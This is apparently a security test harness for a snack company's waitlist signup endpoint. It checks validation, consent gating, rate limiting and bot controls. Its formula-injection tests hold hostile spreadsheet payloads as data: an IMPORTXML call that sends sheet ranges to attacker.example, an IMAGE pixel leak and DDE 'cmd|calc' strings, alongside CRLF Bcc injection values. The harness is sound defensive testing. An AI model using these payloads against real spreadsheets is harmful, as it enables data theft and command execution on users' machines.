/**
 * Attack harness for POST /api/waitlist.
 *
 *   node scripts/attack-waitlist.mjs
 *
 * Boots the real handler behind a local HTTP server and attacks it. A fix you
 * have not attacked is a hypothesis, so every control in api/waitlist.js has a
 * case here that fails loudly if the control is removed.
 *
 * This never touches production. It deliberately leaves SHEETS_WEBHOOK_URL
 * unset, so the handler accepts and logs rather than forwarding anywhere.
 */

import http from 'node:http';
import net from 'node:net';
import { fileURLToPath } from 'node:url';

process.env.NODE_ENV = 'test';
delete process.env.UPSTASH_REDIS_REST_URL;

// ─── Stub upstream ───────────────────────────────────────────────────────────
// The harness boots a fake Apps Script and points the handler at it, so the
// happy path exercises the REAL forward path rather than the
// nothing-configured shortcut.
//
// It used to delete SHEETS_WEBHOOK_URL and assert 200. That encoded a bug: with
// no webhook the row is never stored, so a 200 is a lie, and a suite asserting
// it pins the lie in place. Shape adopted from the merge session's harness,
// which caught it.
let stubRows = 137;
const stub = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {
    let payload = {};
    try {
      payload = JSON.parse(body);
    } catch {
      /* malformed — still answer, the endpoint only reads `count` */
    }
    if (payload.action !== 'confirm') stubRows += 1;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ ok: true, count: stubRows }));
  });
});
await new Promise((r) => stub.listen(0, '127.0.0.1', r));
process.env.SHEETS_WEBHOOK_URL = `http://127.0.0.1:${stub.address().port}/exec`;
process.env.SHEETS_WEBHOOK_TOKEN = 'stub-token';

const { default: handler } = await import('../api/waitlist.js');

// ─── Server ──────────────────────────────────────────────────────────────────

const server = http.createServer((req, res) => {
  handler(req, res).catch((err) => {
    console.error('handler threw:', err);
    res.statusCode = 500;
    res.end('{"ok":false,"error":"server"}');
  });
});

await new Promise((r) => server.listen(0, '127.0.0.1', r));
const BASE = `http://127.0.0.1:${server.address().port}`;

// ─── Client ──────────────────────────────────────────────────────────────────

let ipCounter = 0;
/** Each case gets a fresh source IP so rate-limit state does not bleed between tests. */
function freshIp() {
  ipCounter += 1;
  return `198.51.100.${ipCounter % 250}`;
}

async function post(body, { ip = freshIp(), contentType = 'application/json', method = 'POST', raw = null, headers = {} } = {}) {
  const payload = raw ?? JSON.stringify(body);
  const res = await fetch(`${BASE}/api/waitlist`, {
    method,
    headers: {
      ...(contentType ? { 'Content-Type': contentType } : {}),
      'x-real-ip': ip,
      ...headers,
    },
    body: method === 'GET' || method === 'HEAD' ? undefined : payload,
  });
  let json = null;
  try {
    json = await res.json();
  } catch {
    /* empty body */
  }
  return { status: res.status, json, headers: res.headers };
}

/** A payload that passes every check, as the baseline to mutate from. */
function goodPayload(overrides = {}) {
  return {
    email: `real.person+${Math.random().toString(36).slice(2, 8)}@gmail.com`,
    consent_marketing: true,
    form_render_ts: Date.now() - 9000,
    ...overrides,
  };
}

// ─── Runner ──────────────────────────────────────────────────────────────────

const results = [];
let failures = 0;

let skipped = 0;

/**
 * `detail.skip === true` records a THIRD outcome, not a pass.
 *
 * Two of these cross-checks cannot run until the Conversion branch is merged,
 * and they used to return `pass: true` with the word SKIPPED in the message.
 * The message was honest and the count was not: "150/150 passed" included two
 * checks that never looked at anything. That is the same fault the merge
 * compatibility checker had — passing because nothing was found rather than
 * because nothing was wrong — and a summary line is exactly where nobody reads
 * the fine print.
 */
async function check(name, expectation, fn) {
  try {
    const detail = await fn();
    if (detail.skip) {
      skipped += 1;
      results.push({ name, expectation, actual: detail.actual, skip: true });
      return;
    }
    const pass = detail.pass;
    if (!pass) failures += 1;
    results.push({ name, expectation, actual: detail.actual, pass });
  } catch (err) {
    failures += 1;
    results.push({ name, expectation, actual: `threw: ${err.message}`, pass: false });
  }
}

// 1 — happy path
await check('Valid minimal payload', '200 ok:true + count', async () => {
  const r = await post(goodPayload());
  return {
    pass: r.status === 200 && r.json?.ok === true && Number.isFinite(r.json?.count),
    actual: `${r.status} ${JSON.stringify(r.json)}`,
  };
});

// The case the old harness got backwards.
await check('Unconfigured webhook returns 500, never a false 200', '500', async () => {
  const saved = process.env.SHEETS_WEBHOOK_URL;
  delete process.env.SHEETS_WEBHOOK_URL;
  const { default: unconfigured } = await import(`../api/waitlist.js?nocfg=${Date.now()}`);
  process.env.SHEETS_WEBHOOK_URL = saved;

  const srv = http.createServer((q, s2) => unconfigured(q, s2));
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const res = await fetch(`http://127.0.0.1:${srv.address().port}/api/waitlist`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-real-ip': '203.0.113.201' },
    body: JSON.stringify(goodPayload()),
  });
  const body = await res.json().catch(() => null);
  srv.close();
  return {
    pass: res.status === 500 && body?.ok === false,
    actual: `${res.status} ${JSON.stringify(body)}`,
  };
});

// 2 — method enforcement
for (const method of ['GET', 'PUT', 'DELETE', 'PATCH']) {
  await check(`Method ${method} rejected`, '405', async () => {
    const r = await post(null, { method, raw: '{}' });
    return { pass: r.status === 405, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 3 — content type enforcement (also the CSRF control)
await check('Content-Type: text/plain rejected', '415', async () => {
  const r = await post(goodPayload(), { contentType: 'text/plain' });
  return { pass: r.status === 415, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Content-Type: form-urlencoded rejected (cross-origin form CSRF)', '415', async () => {
  const r = await post(goodPayload(), { contentType: 'application/x-www-form-urlencoded' });
  return { pass: r.status === 415, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 4 — body size
await check('1 MB body rejected', '413', async () => {
  const huge = JSON.stringify({ ...goodPayload(), page_path: 'A'.repeat(1024 * 1024) });
  const r = await post(null, { raw: huge });
  return { pass: r.status === 413, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Chunked oversized body (no Content-Length) rejected', '413', async () => {
  // The declared-size check cannot help here: a chunked request sends no
  // Content-Length at all, so only the byte counter in the read loop catches
  // it. Driven over a raw socket rather than fetch() — undici discards an
  // early response if it arrives while it is still uploading, which would
  // measure the client instead of the server.
  const status = await new Promise((resolve) => {
    const sock = net.connect(server.address().port, '127.0.0.1');
    let buf = '';
    sock.on('connect', () => {
      sock.write(
        'POST /api/waitlist HTTP/1.1\r\n' +
          `Host: 127.0.0.1:${server.address().port}\r\n` +
          'Content-Type: application/json\r\n' +
          'x-real-ip: 198.51.100.251\r\n' +
          'Transfer-Encoding: chunked\r\n\r\n'
      );
      // 20 × 16 KB chunks = 320 KB, forty times the 8 KB cap.
      const chunk = 'B'.repeat(16 * 1024);
      for (let i = 0; i < 20; i++) sock.write(`${chunk.length.toString(16)}\r\n${chunk}\r\n`);
      sock.write('0\r\n\r\n');
    });
    sock.on('data', (d) => {
      buf += d.toString();
      const m = buf.match(/^HTTP\/1\.1 (\d{3})/);
      if (m) {
        resolve(Number(m[1]));
        sock.destroy();
      }
    });
    sock.on('error', () => resolve(0));
    sock.on('close', () => resolve(buf.match(/^HTTP\/1\.1 (\d{3})/)?.[1] ?? 0));
    setTimeout(() => {
      sock.destroy();
      resolve(0);
    }, 5000);
  });
  return { pass: status === 413, actual: String(status) };
});

// 5 — mass assignment / unknown keys
await check('Unknown key {"isAdmin":true} rejected', '400 validation', async () => {
  const r = await post(goodPayload({ isAdmin: true }));
  return { pass: r.status === 400 && r.json?.error === 'validation', actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Unknown key in utm object rejected', '400 validation', async () => {
  const r = await post(goodPayload({ utm: { source: 'x', evil: 'y' } }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 6 — header injection
await check('CRLF in page_path rejected', '400 validation', async () => {
  const r = await post(goodPayload({ page_path: '/x\r\nBcc: victim@example.com' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('CRLF in email rejected', '400 validation', async () => {
  const r = await post(goodPayload({ email: 'a@b.com\r\nBcc: victim@example.com' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('RTL override char in utm.campaign rejected', '400 validation', async () => {
  const r = await post(goodPayload({ utm: { campaign: 'safe‮evil' } }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 7 — consent
await check('consent_marketing missing rejected', '400 validation', async () => {
  const p = goodPayload();
  delete p.consent_marketing;
  const r = await post(p);
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('consent_marketing:false rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_marketing: false }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('consent_marketing:"true" (string) rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_marketing: 'true' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 8 — enum and length enforcement
// The max-3 cap was removed 2026-08-19. "Choose up to 3" makes someone rank
// reasons they hold equally, and the answer comes back a ranking artefact.
await check('New motivation values accepted (fullness, whole_foods)', '200', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: ['fullness', 'whole_foods'] }));
  return { pass: r.status === 200, actual: String(r.status) };
});
// The medication value is accepted ONLY behind a consent whose wording names
// medication. These four cases are the whole control: one accept, three
// distinct ways to be refused.
await check('Medication value accepted with medication-naming consent', '200', async () => {
  const r = await post(goodPayload({
    consent_health: true, motivation: ['glp1_medication'],
    motivation_consent_text_version: '2026-08-19.health-medication.a',
  }));
  return { pass: r.status === 200, actual: String(r.status) };
});
await check('Refused under the OLD health wording, which omits medication', '400', async () => {
  const r = await post(goodPayload({
    consent_health: true, motivation: ['glp1_medication'],
    motivation_consent_text_version: '2026-08-15.health.a',
  }));
  return { pass: r.status === 400, actual: `${r.status} (consent_wording_omits_medication)` };
});
await check('Refused with no health consent at all', '400', async () => {
  const r = await post(goodPayload({
    consent_health: false, motivation: ['glp1_medication'],
    motivation_consent_text_version: '2026-08-19.health-medication.a',
  }));
  return { pass: r.status === 400, actual: String(r.status) };
});
await check('Refused when the wording cannot be resolved — fails closed', '400', async () => {
  // An unregistered id has no text, so nothing can be shown to cover medication.
  const r = await post(goodPayload({
    consent_health: true, motivation: ['glp1_medication'],
    motivation_consent_text_version: 'some-unregistered-id',
  }));
  return { pass: r.status === 400, actual: String(r.status) };
});
await check('The gate reads the wording, so editing copy closes it', 'text-driven', async () => {
  const { consentCoversMedication } = await import('../src/lib/validation.js');
  const withMed = consentCoversMedication('…and whether I am taking a medication such as a GLP-1.');
  const without = consentCoversMedication('Store my reason for interest so you can tailor what you send me.');
  return { pass: withMed && !without, actual: `names it: ${withMed}, silent: ${without}` };
});
await check('Non-medication motivations unaffected by the gate', '200', async () => {
  const r = await post(goodPayload({
    consent_health: true, motivation: ['gut_health', 'fullness'],
    motivation_consent_text_version: '2026-08-15.health.a',
  }));
  return { pass: r.status === 200, actual: String(r.status) };
});

await check('Servings quantity bands accepted', '200', async () => {
  const codes = await Promise.all(['srv_1_2', 'srv_3_5', 'srv_6_10', 'srv_11_20', 'srv_gt_20']
    .map((v) => post(goodPayload({ quantity_band: v }))));
  return { pass: codes.every((r) => r.status === 200), actual: codes.map((r) => r.status).join(',') };
});
await check('Legacy bite bands now REJECTED — client stopped sending them', '400', async () => {
  const codes = await Promise.all(['lt_4', '4_8', '9_16', '17_30', 'gt_30']
    .map((v) => post(goodPayload({ quantity_band: v }))));
  return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
});
await check('srv_ prefix kept after the legacy values went', 'unit stays visible', async () => {
  // The prefix outlives the migration on purpose: the SHEET still holds
  // bite-counting rows, so a query pooling both generations is still wrong.
  // Dropping it because "everything is servings now" would be true of the enum
  // and false of the data.
  const { QUANTITY_BANDS } = await import('../src/lib/validation.js');
  return {
    pass: QUANTITY_BANDS.length === 5 && QUANTITY_BANDS.every((v) => v.startsWith('srv_')),
    actual: QUANTITY_BANDS.join(', '),
  };
});
await check('price_band_other cap holds a real answer but not an essay', '40', async () => {
  const ok = await post(goodPayload({ price_band: 'other', price_band_other: '$25-30 depends on size' }));
  const no = await post(goodPayload({ price_band: 'other', price_band_other: 'x'.repeat(41) }));
  return { pass: ok.status === 200 && no.status === 400, actual: `22ch->${ok.status}, 41ch->${no.status}` };
});

// price_band: current bands live; the legacy set was removed once the client
// stopped sending it.
await check('New price bands accepted', '200', async () => {
  const codes = await Promise.all(['25_34', '35_44', 'gt_45'].map((v) => post(goodPayload({ price_band: v }))));
  return { pass: codes.every((r) => r.status === 200), actual: codes.map((r) => r.status).join(',') };
});
await check('Legacy price bands now REJECTED — client stopped sending them', '400', async () => {
  const codes = await Promise.all(['lt_24', '24_29', '30_35', '36_42', 'gt_42'].map((v) => post(goodPayload({ price_band: v }))));
  return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
});
await check('price_band_other stored verbatim, never parsed', 'as typed', async () => {
  const { validateWaitlist } = await import('../src/lib/validation.js');
  const typed = '$25-30, depends on the size';
  const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, price_band: 'other', price_band_other: typed });
  return { pass: v.ok && v.data.price_band_other === typed, actual: JSON.stringify(v.data?.price_band_other) };
});
await check('price_band_other requires price_band === other', '400', async () => {
  const r = await post(goodPayload({ price_band: '25_34', price_band_other: 'x' }));
  return { pass: r.status === 400, actual: String(r.status) };
});
await check('Formula-shaped price answer neutralised', "prefixed with '", async () => {
  const { sanitizeForSheet } = await import('../src/lib/validation.js');
  const out = ['-5 less', '=30', '+40 maybe', '@30'].map(sanitizeForSheet);
  return { pass: out.every((o) => o.startsWith("'")), actual: out.join(' | ') };
});
await check('motivation accepts every value at once — no product cap', '200', async () => {
  // Needs the medication-naming consent, because the full set now includes
  // glp1_medication. The first run of this test failed for exactly that reason,
  // which is the gate doing its job on a payload that looked innocuous.
  const { MOTIVATIONS } = await import('../src/lib/validation.js');
  const r = await post(goodPayload({
    consent_health: true,
    motivation: [...MOTIVATIONS],
    motivation_consent_text_version: '2026-08-19.health-medication.a',
  }));
  return { pass: r.status === 200, actual: `${MOTIVATIONS.length} selected -> ${r.status}` };
});
await check('multi-select bound tracks the enum, so it cannot go stale', 'auto', async () => {
  // The bound is values.length, not a hand-written number — add an enum value
  // and the cap grows with it. This asserts the relationship, not a constant.
  const { waitlistSchema, MOTIVATIONS, DIETARY, CHANNELS } = await import('../src/lib/validation.js');
  const shape = waitlistSchema._def?.schema?.shape ?? waitlistSchema.shape;
  const ok = [['motivation', MOTIVATIONS], ['dietary', DIETARY], ['channel', CHANNELS]]
    .every(([f, l]) => shape[f].safeParse([...l]).success);
  return { pass: ok, actual: `motivation ${MOTIVATIONS.length}, dietary ${DIETARY.length}, channel ${CHANNELS.length} — all accepted in full` };
});
await check('Absurd array still rejected — structural bound intact', '400 validation', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: Array(500).fill('energy') }));
  return { pass: r.status === 400, actual: `500 entries -> ${r.status}` };
});
await check('Per-item validity survives the uncapping', '400 validation', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: ['energy', 'not_a_value'] }));
  return { pass: r.status === 400, actual: String(r.status) };
});
await check('motivation with invalid enum rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: ['cancer'] }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
// zip is the one deliberately lenient field: an unrecognised value is dropped
// rather than costing the whole submission. Everything else stays strict.
{
  const { validateWaitlist } = await import('../src/lib/validation.js');
  for (const [zip, label] of [
    ['0150', 'Norway, 4 digits'],
    ['SW1A 1AA', 'UK, alphanumeric'],
    ['01000-000', 'Brazil, hyphenated'],
    ['9430', 'truncated US'],
    ['=cmd|calc', 'formula payload'],
    ['not a zip at all', 'free text'],
  ]) {
    await check(`zip "${zip}" (${label}) dropped, submission survives`, '200, zip null', async () => {
      const r = await post(goodPayload({ zip }));
      const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, zip });
      return {
        pass: r.status === 200 && v.ok && v.data.zip === null,
        actual: `${r.status}, stored ${JSON.stringify(v.data?.zip)}`,
      };
    });
  }

  await check('Valid US zip still stored', '200, zip kept', async () => {
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, zip: ' 94305 ' });
    return { pass: v.ok && v.data.zip === '94305', actual: JSON.stringify(v.data?.zip) };
  });

  await check('Non-string zip still rejected (malformed client, not a postcode)', '400 validation', async () => {
    const r = await post(goodPayload({ zip: { evil: 1 } }));
    return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });

  await check('Leniency does NOT leak to other fields', '400 validation', async () => {
    // The scoping check: if this ever starts returning 200 the exemption has
    // spread beyond zip, which is the thing to catch.
    const bad = await Promise.all([
      post(goodPayload({ flavor: 'not_a_flavor' })),
      post(goodPayload({ intent: 'maybe' })),
      post(goodPayload({ referral_source: 'billboard' })),
      post(goodPayload({ price_band: 'cheap' })),
      post(goodPayload({ motivation: ['not_an_option'], consent_health: true })),
    ]);
    const codes = bad.map((r) => r.status);
    return { pass: codes.every((c) => c === 400), actual: codes.join(',') };
  });
}
await check('page_path over 200 chars rejected', '400 validation', async () => {
  const r = await post(goodPayload({ page_path: '/' + 'a'.repeat(300) }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 9 — email quality
for (const [email, why] of [
  ['admin@zucasnacks.com', 'role address'],
  ['postmaster@example.com', 'role address'],
  ['throwaway@mailinator.com', 'disposable'],
  ['no-at-sign', 'malformed'],
  ['a..b@example.com', 'double dot'],
  ['x@example', 'no TLD'],
]) {
  await check(`Email "${email}" rejected (${why})`, '400 validation', async () => {
    const r = await post(goodPayload({ email }));
    return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 10 — bot layers
await check('Filled honeypot silently discarded', '200 ok:true, not stored', async () => {
  const r = await post(goodPayload({ hp_field: 'http://spam.example' }));
  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)} (log shows reject.bot honeypot)` };
});
await check('Sub-2-second submission rejected as bot', '200 ok:true, not stored', async () => {
  const r = await post(goodPayload({ form_render_ts: Date.now() - 500 }));
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)} (log shows reject.bot too_fast)` };
});
await check('Human-speed submission (9s) accepted', '200 ok:true, stored', async () => {
  const r = await post(goodPayload({ form_render_ts: Date.now() - 9000 }));
  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)} (log shows accepted)` };
});

// 11 — origin
await check('Cross-origin POST rejected', '403', async () => {
  const r = await post(goodPayload(), { headers: { Origin: 'https://evil.example' } });
  return { pass: r.status === 403, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Own-origin POST accepted', '200', async () => {
  const r = await post(goodPayload(), { headers: { Origin: 'https://zucasnacks.com' } });
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 12 — malformed JSON
for (const [raw, label] of [
  ['not json at all', 'garbage'],
  ['[]', 'array'],
  ['"string"', 'bare string'],
  ['null', 'null'],
  ['{"email":', 'truncated'],
]) {
  await check(`Malformed body (${label}) rejected`, '400 validation', async () => {
    const r = await post(null, { raw });
    return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 13 — rate limiting: 100 rapid requests from one IP
await check('100 rapid requests from one IP', 'first 5 → 200, rest → 429', async () => {
  const ip = '203.0.113.77';
  const codes = [];
  for (let i = 0; i < 100; i++) {
    const r = await post(goodPayload(), { ip });
    codes.push(r.status);
  }
  const ok = codes.filter((c) => c === 200).length;
  const limited = codes.filter((c) => c === 429).length;
  return {
    pass: ok === 5 && limited === 95,
    actual: `${ok}×200, ${limited}×429, ${codes.length - ok - limited} other`,
  };
});

await check('429 carries Retry-After', 'header present', async () => {
  const ip = '203.0.113.88';
  let last;
  for (let i = 0; i < 8; i++) last = await post(goodPayload(), { ip });
  return {
    pass: last.status === 429 && Boolean(last.headers.get('retry-after')),
    actual: `${last.status}, Retry-After: ${last.headers.get('retry-after')}`,
  };
});

await check('429 body leaks no internals', 'exactly {"ok":false,"error":"rate_limited"}', async () => {
  const ip = '203.0.113.99';
  let last;
  for (let i = 0; i < 8; i++) last = await post(goodPayload(), { ip });
  const keys = Object.keys(last.json ?? {}).sort().join(',');
  return { pass: keys === 'error,ok' && last.json.error === 'rate_limited', actual: JSON.stringify(last.json) };
});

await check('Spoofed X-Forwarded-For does not reset the limiter', 'still 429', async () => {
  const ip = '203.0.113.55';
  for (let i = 0; i < 6; i++) await post(goodPayload(), { ip });
  const r = await post(goodPayload(), { ip, headers: { 'X-Forwarded-For': '1.2.3.4' } });
  return { pass: r.status === 429, actual: `${r.status}` };
});

// 14 — formula injection (unit-level: the value that would reach the sheet)
{
  const { sanitizeForSheet, sanitizeRecord } = await import('../src/lib/validation.js');
  const payloads = [
    '=IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",A1:E500)),"//a")',
    '+HYPERLINK("https://attacker.example","click")',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(1+1)*cmd|\' /C calc\'!A0',
    '=IMAGE("https://attacker.example/pixel?d="&A2)',
  ];
  for (const p of payloads) {
    await check(`Formula payload neutralized: ${p.slice(0, 34)}…`, "prefixed with ' → inert text", async () => {
      const out = sanitizeForSheet(p);
      return { pass: out.startsWith("'") && !/^[=+\-@]/.test(out), actual: out.slice(0, 46) + '…' };
    });
  }
  await check('Tab-escape formula payload neutralized', "prefixed with '", async () => {
    const out = sanitizeForSheet('\t=IMPORTXML("https://attacker.example","//a")');
    return { pass: out.startsWith("'"), actual: out.slice(0, 40) };
  });
  await check('sanitizeRecord reaches nested utm values', "utm.source prefixed with '", async () => {
    const out = sanitizeRecord({ email: 'a@b.com', utm: { source: '=1+1' } });
    return { pass: out.utm.source === "'=1+1", actual: JSON.stringify(out.utm) };
  });
}

// 15 — health-adjacent data requires separate consent
{
  await check('motivation dropped when consent_health is absent', 'stored as null', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, motivation: ['gut_health'] });
    const stored = v.ok && v.data.consent_health ? v.data.motivation : null;
    return { pass: stored === null, actual: `consent_health=${v.data?.consent_health}, stored motivation=${JSON.stringify(stored)}` };
  });
  await check('motivation kept when consent_health is true', 'stored', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['gut_health'] });
    const stored = v.ok && v.data.consent_health ? v.data.motivation : null;
    return { pass: Array.isArray(stored) && stored[0] === 'gut_health', actual: JSON.stringify(stored) };
  });
}

// 16 — normalization
{
  const { validateWaitlist } = await import('../src/lib/validation.js');
  await check('Email uppercased + padded is normalized', 'lowercased and trimmed', async () => {
    const v = validateWaitlist({ email: '  Real.Person@GMAIL.com  ', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'real.person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Zero-width char in email stripped (duplicate-evasion)', 'normalizes to same address', async () => {
    const v = validateWaitlist({ email: 'real​.person@gmail.com', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'real.person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Full-width @ normalized via NFKC', 'becomes a normal address', async () => {
    const v = validateWaitlist({ email: 'person＠gmail.com', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Duplicate motivation values collapsed', 'deduplicated', async () => {
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['energy', 'energy'] });
    return { pass: v.ok && v.data.motivation.length === 1, actual: JSON.stringify(v.data?.motivation ?? v.issues) };
  });
}

// 17 — consent evidence (contract amendment): server-derived, not client-supplied
//
// The burst cases above deliberately exhaust the global ceiling, so clear the
// limiter first — otherwise everything below returns 429 and passes or fails
// for reasons that have nothing to do with what it is testing.
{
  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
  __resetInMemoryLimiter();
}

await check('Client-supplied country rejected', '400 validation', async () => {
  const r = await post(goodPayload({ country: 'US' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Client-supplied consent_timestamp rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_timestamp: '1999-01-01T00:00:00Z' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Client-supplied consent_receipt rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_receipt: '{"marketing":true}' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Registered consent_text_version accepted', '200', async () => {
  const r = await post(goodPayload({ consent_text_version: '2026-08-15.marketing.a' }));
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Unregistered consent_text_version accepted but flagged', '200, logged', async () => {
  // Deliberate: rejecting would mean a copy change that forgets to register a
  // wording breaks every signup on the site.
  const r = await post(goodPayload({ consent_text_version: 'never-registered.v9' }));
  return {
    pass: r.status === 200,
    actual: `${r.status} (log: consent.unregistered_text_version)`,
  };
});
await check('Malformed consent_text_version rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_text_version: 'bad version!<script>' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

{
  const { deriveCountry, isEea, resolveConsentText } = await import('../src/lib/validation.js');
  const mk = (h) => ({ headers: h });

  await check('country derived from x-vercel-ip-country', 'NO', async () => {
    const c = deriveCountry(mk({ 'x-vercel-ip-country': 'no' }));
    return { pass: c === 'NO', actual: c };
  });
  await check('country falls back to XX when absent', 'XX', async () => {
    const c = deriveCountry(mk({}));
    return { pass: c === 'XX', actual: c };
  });
  await check('malformed country header rejected, not stored', 'XX', async () => {
    const c = deriveCountry(mk({ 'x-vercel-ip-country': '=IMPORTXML("http://evil","//a")' }));
    return { pass: c === 'XX', actual: c };
  });
  await check('EEA classification: NO/DE/GB in, US/BR/SG out', 'correct', async () => {
    const inEea = ['NO', 'DE', 'GB', 'IS'].every(isEea);
    const outEea = ['US', 'BR', 'SG', 'JP', 'KR', 'MX', 'XX'].every((c) => !isEea(c));
    return { pass: inEea && outEea, actual: `in=${inEea} out=${outEea}` };
  });
  await check('unknown consent version resolves to registry_match:false', 'flagged', async () => {
    const r = resolveConsentText('nope.v1');
    return { pass: r.registry_match === false && r.text === null, actual: JSON.stringify(r) };
  });
  await check('absent consent version resolves to "unspecified"', 'unspecified', async () => {
    const r = resolveConsentText(null);
    return { pass: r.version === 'unspecified', actual: JSON.stringify(r) };
  });
}

// 18 — motivation_consent_text_version as its own field
await check('motivation_consent_text_version accepted as a separate field', '200', async () => {
  const r = await post(
    goodPayload({
      consent_health: true,
      motivation: ['gut_health'],
      consent_text_version: '2026-08-15.marketing.a',
      motivation_consent_text_version: '2026-08-15.health.a',
    })
  );
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Two identifiers joined with "+" rejected', '400 validation', async () => {
  // The shape growth was forced into before this field existed. `+` is outside
  // the permitted charset precisely so a packed pair cannot masquerade as one id.
  const r = await post(
    goodPayload({ consent_text_version: '2026-08-15.marketing.a+2026-08-15.health.a' })
  );
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 19 — regime reconciliation
{
  const { reconcileConsentRegime, consentRegime } = await import('../src/lib/validation.js');

  // The vocabulary growth actually emits. `eea` is canonical; the rest are
  // accepted synonyms so nobody has to guess which spelling this file prefers.
  for (const [id, expected] of [
    ['mkt-eea-2026-08.a', 'eea'],
    ['health-eea-2026-08.a', 'eea'],
    ['mkt-eu-2026-08.a', 'eea'],
    ['mkt-gdpr-2026-08.a', 'eea'],
    ['mkt-uk-2026-08.a', 'eea'],
    ['mkt-us-2026-08.a', 'us'],
    ['mkt-usa-2026-08.a', 'us'],
    ['mkt-2026-08.a', 'unknown'],
  ]) {
    await check(`consentRegime("${id}") → ${expected}`, expected, async () => {
      const r = consentRegime(id);
      return { pass: r === expected, actual: r };
    });
  }

  await check('EEA visitor + mkt-eea- id → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-eea-2026-08.a' });
    return { pass: r.needs_reconsent === false && r.status === 'ok', actual: `${r.status}` };
  });

  await check('consentRegime tokenises rather than substring-matches', 'no false US match', async () => {
    const safe = consentRegime('2026-08-15.august.a'); // contains "us" inside a word
    const real = consentRegime('mkt-us-2026-08.a');
    return { pass: safe !== 'us' && real === 'us', actual: `august→${safe}, mkt-us→${real}` };
  });

  await check('EEA visitor shown US marketing copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === true, actual: r.reason ?? 'not flagged' };
  });

  await check('UK visitor shown US marketing copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({ country: 'GB', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === true, actual: r.reason ?? 'not flagged' };
  });

  await check('EEA visitor shown US health copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({
      country: 'DE',
      marketingVersion: 'mkt-eu-2026-08.a',
      healthVersion: 'health-us-2026-08.a',
    });
    return { pass: r.needs_reconsent === true && r.reason.startsWith('health'), actual: r.reason ?? 'not flagged' };
  });

